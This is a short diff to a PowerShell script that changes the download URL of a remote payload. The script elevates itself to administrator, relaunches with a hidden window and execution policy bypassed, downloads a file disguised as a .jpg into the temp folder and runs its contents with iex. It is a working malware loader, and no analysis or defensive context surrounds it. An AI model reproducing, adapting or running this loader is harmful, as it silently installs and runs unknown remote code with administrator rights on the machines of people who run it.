@@ -1,7 +1,7 @@
 if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){
     Start-Process -Verb RunAs powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden;exit
 }
-$url="https://surl.li/vbiwyb"
+$url="https://raw.githubusercontent.com/node-nl0/go/main/0x480x8b0x5.jpg"
 $path="$env:TEMP\0x480x8b0x5.jpg"
 (New-Object Net.WebClient).DownloadFile($url,$path)
 iex(Get-Content $path -Raw)
